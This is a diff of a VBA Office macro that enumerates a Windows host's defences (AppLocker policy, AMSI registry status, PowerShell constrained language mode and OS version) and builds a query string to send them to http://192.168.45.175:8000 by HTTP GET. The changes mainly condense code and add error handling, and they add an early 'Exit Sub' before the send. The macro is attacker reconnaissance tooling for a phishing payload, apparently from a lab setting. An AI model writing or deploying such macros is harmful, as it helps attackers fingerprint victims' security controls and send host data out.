@@ -18,13 +18,7 @@ End Sub
 
 ' Main function that calls the separate functions
 Sub CheckSystemStatus()
-    Dim strUrl As String
-    Dim applockerStatus As String
-    Dim osStatus As String
-    Dim amsiStatus As String
-    Dim clmStatus As String
-    Dim result As String
-    Dim hReq As Object
+    Dim strUrl As String, applockerStatus As String, osStatus As String, amsiStatus As String, clmStatus As String, result As String, hReq As Object
     
     ' Call separate functions to get status
     applockerStatus = CheckAppLockerStatus()
@@ -38,10 +32,10 @@ Sub CheckSystemStatus()
 
     ' Combine results
     result = "AppLocker=" & applockerStatus & "&AMSI=" & amsiStatus & "&CLM=" & clmStatus & "&OS=""" & osStatus & """"
-    ' Debug.Print result
+    Debug.Print result
     ' Change URL
     strUrl = "http://192.168.45.175:8000/status.txt?" & result
-
+    Exit Sub
     ' Send GET request
     Set hReq = CreateObject("MSXML2.XMLHTTP")
     
@@ -59,9 +53,7 @@ End Sub
 
 ' Function to check AppLocker status
 Function CheckAppLockerStatus() As String
-    Dim WindowShell As Object
-    Dim regValue
-    Dim status As String
+    Dim WindowShell As Object, regValue, status As String
     
     Set WindowShell = CreateObject("WScript.shell")
     
@@ -84,14 +76,7 @@ End Function
 Function GetOperatingSystem() As String
     ' Returns: OS information as string (e.g., "Windows 10 Pro 64-bit (10.0.19045)")
     
-    Dim objWMIService As Object
-    Dim colItems As Object
-    Dim objItem As Object
-    Dim osName As String
-    Dim osVersion As String
-    Dim osArchitecture As String
-    Dim computerSystem As Object
-    Dim osType As String
+    Dim objWMIService As Object, colItems As Object, objItem As Object, osName As String, osVersion As String, osArchitecture As String, computerSystem As Object, osType As String
         
     ' Connect to WMI
     Set objWMIService = GetObject("winmgmts:\\.\root\CIMV2")
@@ -129,9 +114,7 @@ End Function
 
 ' Function to get AMSI status
 Function CheckAMSIStatus() As String
-    Dim WindowShell As Object
-    Dim amsiRegValue
-    Dim status As String
+    Dim WindowShell As Object, amsiRegValue, status As String
     
     status = "unknown"  ' Default status
     
@@ -169,26 +152,38 @@ End Function
 
 ' Function to get CLM
 Function GetPowerShellLanguageMode() As String
-    ' Returns: "FullLanguage", "ConstrainedLanguage", "RestrictedLanguage", "NoLanguage", or "Unknown"
+    Dim shell As Object, exec As Object, output As String
     
-    Dim ps As Object
-    Dim result As String
-    Dim output As String
-    Dim languageMode As String
-    Dim shell As Object
-    Dim exec As Object
-        
-    ' Crear objeto Shell
+    On Error Resume Next
+    
     Set shell = CreateObject("WScript.Shell")
+    If Err.Number <> 0 Then GoTo ErrorHandler
     
-    ' Ejecutar comando de PowerShell para obtener LanguageMode
     Set exec = shell.exec("powershell -Command ""$ExecutionContext.SessionState.LanguageMode""")
+    If Err.Number <> 0 Then GoTo ErrorHandler
     
-    ' Leer la salida
-    output = exec.StdOut.ReadAll()
-    If output <> "" Then
-        GetPowerShellLanguageMode = output
-    Else
-        GetPowerShellLanguageMode = "Unknown"
+    ' Pequeña pausa para que PowerShell responda
+    Dim startTime As Double: startTime = Timer
+    Do While exec.status = 0
+        If Timer > startTime + 2 Then Exit Do
+        DoEvents
+    Loop
+    
+    If Not exec.StdOut.AtEndOfStream Then
+        output = exec.StdOut.ReadAll()
     End If
+    
+    On Error GoTo 0
+    
+    If output <> "" Then
+        output = Trim(Replace(Replace(output, vbCrLf, ""), vbLf, ""))
+        Select Case output
+            Case "FullLanguage", "ConstrainedLanguage", "RestrictedLanguage", "NoLanguage"
+                GetPowerShellLanguageMode = output
+                Exit Function
+        End Select
+    End If
+    
+ErrorHandler:
+    GetPowerShellLanguageMode = "NoLanguage"
 End Function
